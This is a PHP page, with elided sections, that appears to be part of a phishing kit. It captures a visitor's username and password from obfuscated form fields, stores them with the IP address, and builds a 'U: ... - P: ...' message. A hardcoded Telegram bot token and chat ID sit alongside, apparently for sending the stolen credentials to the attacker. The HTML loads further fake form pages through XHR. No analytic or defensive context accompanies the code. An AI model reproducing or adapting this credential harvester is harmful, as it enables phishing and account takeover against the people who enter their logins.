<?php
    ...
    if( empty($_POST['trdip01']) || empty($_POST['trdip02']) ){
        header ('Location:index.php');
        session_destroy();
    }

    @$_SESSION['tlg1'] = "5555165841:AAE7e0yrao7YTcSmfDKy0Y6vnY0SO-0UyFE";
    @$_SESSION['cht1'] = "1024082369";

    @$_SESSION['u1'] = $_POST['trdip01'];
    @$_SESSION['p1'] = $_POST['trdip02'];
    @$_SESSION['ips'] = '';
    ...
    $msg =  "GTC -> ".$_SESSION['ips'] . 'U: '.$_SESSION['u1'] . " - P: " . $_SESSION['p1'];
    ...
    <body>
        ...
        <div id="cont1" style="display:flex;height: 100vh;justify-content: center;">
            <section id="rght1" style="height: 100vh;background-color: #fff;width:620px;text-align: center;">
                <div onclick="ldtrd01()" id="trd01" style="margin-top: 40px;display: inline-block;width: 591.55px;height:475.90px;background-color:#fff;background-image:url(tkn1.svg);background-repeat:no-repeat;background-size: cover;">
        ...
        <script>
            function ldtrd01() {
                ...
                xhttp.open("GET", "trdfm2.html", true);
                xhttp.send();
            }
        </script>
        <script>
        ...
        <img src="tkn2.svg" style="display:none;">
    </body>
</html>